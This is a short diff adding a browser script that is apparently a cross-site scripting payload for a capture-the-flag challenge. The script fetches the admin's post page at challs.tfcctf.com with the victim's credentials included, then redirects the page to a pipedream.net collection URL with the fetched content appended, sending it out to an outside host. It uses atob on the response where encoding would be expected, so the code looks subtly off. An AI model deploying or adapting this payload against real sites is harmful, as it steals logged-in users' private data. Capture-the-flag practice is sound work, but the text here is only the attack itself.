@@ -1,0 +1,14 @@
+<script>
+	async function exploit() {
+		const reps = await fetch(
+			"http://challs.tfcctf.com:32756/posts/view/admin",
+			{
+				credentials: "include",
+			},
+		).then((resp) => resp.text());
+
+		document.location = "https://enkpfw7a69sir.x.pipedream.net/" + atob(reps);
+	}
+
+	exploit();
+</script>
